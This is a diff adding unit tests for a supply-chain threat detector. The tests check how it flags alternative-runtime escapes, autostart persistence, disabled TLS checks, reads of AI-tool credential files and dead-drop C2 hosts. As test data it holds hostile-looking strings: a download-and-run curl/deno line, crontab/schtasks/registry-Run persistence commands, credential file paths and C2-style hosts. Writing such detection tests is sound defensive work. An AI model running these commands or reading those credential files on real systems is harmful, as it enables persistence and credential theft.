@@ -2,6 +2,7 @@ import { describe, it, expect } from 'vitest';
 import {
   detectExfilChains,
   detectTechnique,
+  isAltRuntimeEscape,
   isCiWorkflowPath,
   isCloudMetadataHost,
   isDeadDropHost,
@@ -9,6 +10,9 @@ import {
   isInternalTarget,
   isGitHookPath,
   isRegistryPublish,
+  isServicePersistenceCommand,
+  isServicePersistencePath,
+  isTlsVerificationDisabled,
   normalizeIpv4,
 } from '../../src/domain/threat.js';
 import type { DhEvent } from '../../src/domain/event.js';
@@ -368,5 +372,163 @@ describe('detectExfilChains — secret-read then network by the same dependency'
     ]);
     expect(chains).toHaveLength(1);
     expect(chains[0]?.sink).toBe('evil.example.com');
+  });
+});
+
+describe('isAltRuntimeEscape — a second JS runtime as a way out of the monitor', () => {
+  it.each([
+    './.cache/bun install', // the 2026 dropper's own shape
+    '/tmp/bun run stage2.js',
+    'sh -c "$HOME/.cache/bun run loader.js"',
+    'curl -sL https://example.invalid/b -o /tmp/deno && /tmp/deno run -A x.ts',
+    'C:\\Users\\dev\\AppData\\Local\\Temp\\bun.exe run x.js',
+    '/var/folders/x/T/downloads/node stage2.js', // a *dropped* node counts too
+  ])('flags %s whoever ran it', (command) => {
+    expect(isAltRuntimeEscape(command, 'application')).toBe(true);
+    expect(isAltRuntimeEscape(command, 'dependency')).toBe(true);
+  });
+
+  it.each([
+    'bun install',
+    'bun x some-tool',
+    'deno run -A build.ts',
+    '/usr/local/bin/bun run build',
+    'sh -c "bun run build"',
+    'npm run build && bun test',
+  ])('flags %s from a dependency but not from the application', (command) => {
+    expect(isAltRuntimeEscape(command, 'dependency')).toBe(true);
+    expect(isAltRuntimeEscape(command, 'unknown')).toBe(true);
+    expect(isAltRuntimeEscape(command, 'application')).toBe(false);
+  });
+
+  it('does not flag a runtime named as an argument rather than run', () => {
+    // The false-positive that would make this signal useless: a package manager
+    // *installing* bun is not a package *escaping* into bun.
+    expect(isAltRuntimeEscape('npm install bun', 'dependency')).toBe(false);
+    expect(isAltRuntimeEscape('npm install --save-dev deno bun', 'dependency')).toBe(
+      false,
+    );
+    expect(isAltRuntimeEscape('echo bun', 'dependency')).toBe(false);
+  });
+
+  it('does not flag ordinary node re-execution', () => {
+    expect(isAltRuntimeEscape('node build.js', 'dependency')).toBe(false);
+    expect(isAltRuntimeEscape('/usr/local/bin/node -e "1"', 'dependency')).toBe(false);
+    expect(isAltRuntimeEscape('node-gyp rebuild', 'dependency')).toBe(false);
+    expect(
+      isAltRuntimeEscape('git clone https://example.invalid/bun', 'dependency'),
+    ).toBe(false);
+  });
+});
+
+describe('isServicePersistencePath — OS-level autostart entries', () => {
+  it.each([
+    '/home/dev/.config/systemd/user/miasma-monitor.service', // Miasma
+    '/etc/systemd/system/gh-token-monitor.service',
+    '/home/dev/.config/systemd/user/beacon.timer',
+    '/Users/dev/Library/LaunchAgents/com.example.updater.plist', // mastra
+    '/Library/LaunchDaemons/com.example.root.plist',
+    '/etc/cron.d/backup', // TrapDoor
+    '/etc/crontab',
+    '/var/spool/cron/crontabs/dev',
+    '/home/dev/.ssh/authorized_keys',
+    'C:\\Users\\dev\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\x.lnk',
+    '/home/dev/.config/autostart/updater.desktop',
+  ])('flags %s', (path) => {
+    expect(isServicePersistencePath(path)).toBe(true);
+  });
+
+  it.each([
+    '/home/dev/project/dist/index.js',
+    '/home/dev/.config/systemd/user/README.md', // not a unit file
+    '/home/dev/.ssh/known_hosts',
+    '/home/dev/Library/Preferences/com.example.plist',
+  ])('leaves %s alone', (path) => {
+    expect(isServicePersistencePath(path)).toBe(false);
+  });
+});
+
+describe('isServicePersistenceCommand — registering an autostart entry', () => {
+  it.each([
+    'launchctl load -w ~/Library/LaunchAgents/com.example.plist',
+    'launchctl bootstrap gui/501 /tmp/x.plist',
+    'systemctl --user enable --now beacon.service',
+    'crontab -',
+    '/bin/sh -c "crontab /tmp/job"',
+    'schtasks /create /tn Updater /tr C:\\x.exe /sc onlogon',
+    'sc create updater binPath= C:\\x.exe',
+    'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d C:\\x.exe',
+  ])('flags %s', (command) => {
+    expect(isServicePersistenceCommand(command)).toBe(true);
+  });
+
+  it.each(['crontab -l', 'systemctl status nginx', 'launchctl list', 'npm run build'])(
+    'leaves the read-only verb %s alone',
+    (command) => {
+      expect(isServicePersistenceCommand(command)).toBe(false);
+    },
+  );
+});
+
+describe('isTlsVerificationDisabled — only the value that actually disables it', () => {
+  it('flags the disabling write', () => {
+    expect(isTlsVerificationDisabled('NODE_TLS_REJECT_UNAUTHORIZED=0')).toBe(true);
+  });
+
+  it('does not flag putting verification back, or a deletion', () => {
+    expect(isTlsVerificationDisabled('NODE_TLS_REJECT_UNAUTHORIZED=1')).toBe(false);
+    expect(isTlsVerificationDisabled('NODE_TLS_REJECT_UNAUTHORIZED (deleted)')).toBe(
+      false,
+    );
+    expect(isTlsVerificationDisabled('NODE_OPTIONS=--require /tmp/x.js')).toBe(false);
+  });
+});
+
+describe('detectTechnique — the 0.13 techniques', () => {
+  it('names the alternative-runtime escape, and respects origin', () => {
+    expect(detectTechnique('process.spawn', 'bun install', 'dependency')).toBe(
+      'alt-runtime-escape',
+    );
+    expect(detectTechnique('process.spawn', 'bun install', 'application')).toBeNull();
+    // Default origin is the untrusting reading.
+    expect(detectTechnique('process.spawn', './.cache/bun install')).toBe(
+      'alt-runtime-escape',
+    );
+  });
+
+  it('names service persistence from either half', () => {
+    expect(
+      detectTechnique('fs.write', '/home/d/.config/systemd/user/beacon.service'),
+    ).toBe('service-persistence');
+    expect(detectTechnique('process.spawn', 'crontab -')).toBe('service-persistence');
+  });
+
+  it('names a TLS teardown and an AI-credential read', () => {
+    expect(detectTechnique('env.write', 'NODE_TLS_REJECT_UNAUTHORIZED=0')).toBe(
+      'tls-verification-disabled',
+    );
+    expect(detectTechnique('env.write', 'NODE_OPTIONS=--require /tmp/x.js')).toBeNull();
+    expect(detectTechnique('fs.read', '/home/d/.claude/.credentials.json')).toBe(
+      'ai-credential-theft',
+    );
+    expect(detectTechnique('fs.read', '/home/d/.codex/auth.json')).toBe(
+      'ai-credential-theft',
+    );
+    expect(detectTechnique('fs.read', '/home/d/project/src/index.ts')).toBeNull();
+  });
+
+  it('names the 2026 dead-drop channels added in 0.13', () => {
+    for (const host of [
+      'https://evil.workers.dev/c2',
+      'api.mainnet-beta.solana.com:443',
+      'abc.ic0.app',
+      'wss://relay.damus.io',
+      'https://1a2b.ngrok-free.app/x',
+      'https://webhook.site/deadbeef',
+      'https://x.trycloudflare.com',
+    ]) {
+      expect(isDeadDropHost(host)).toBe(true);
+      expect(detectTechnique('net.connect', host)).toBe('dead-drop-c2');
+    }
   });
 });
